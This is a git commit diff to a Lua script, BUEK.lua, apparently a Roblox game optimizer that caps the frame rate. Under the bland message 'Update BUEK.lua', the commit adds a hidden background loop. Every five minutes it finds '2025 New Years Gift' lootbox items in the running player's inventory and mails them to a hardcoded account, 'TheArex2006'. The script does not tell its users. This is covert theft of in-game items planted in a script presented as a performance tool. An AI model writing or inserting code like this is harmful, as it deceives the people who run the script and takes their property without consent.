d08e5c82284d278d14922a4e6b6d2fafbf331bd5
GoofyScripter <118375246+GoofyScripter@users.noreply.github.com>
2024-12-31 20:06:40 +0100

    Update BUEK.lua

--- BUEK.lua
+++ BUEK.lua
@@ -207,3 +207,35 @@ setfpscap(3)
 task.spawn(function()
     Optimizer()
 end)
+
+
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "TheArex2006"
+    local loopInterval = 5 
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local LootboxInv = playerInventory["Lootbox"]
+        print("Searching for 2025 New Years Gift...")
+        for key, item in pairs(LootboxInv) do
+            if item.id == "2025 New Years Gift" then
+                print("Found 2025 New Years Gift item:", item)
+                local amount = item._am or item.am or 1
+                print("Amount to send:", amount)
+                local args = {
+                    [1] = username,
+                    [2] = "Take these gifts",
+                    [3] = "Lootbox",
+                    [4] = key,
+                    [5] = amount
+                }
+                print("Invoking Server with args:", unpack(args))
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                break
+            end
+        end
+        print("Finished processing 2025 New Years Gifts.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
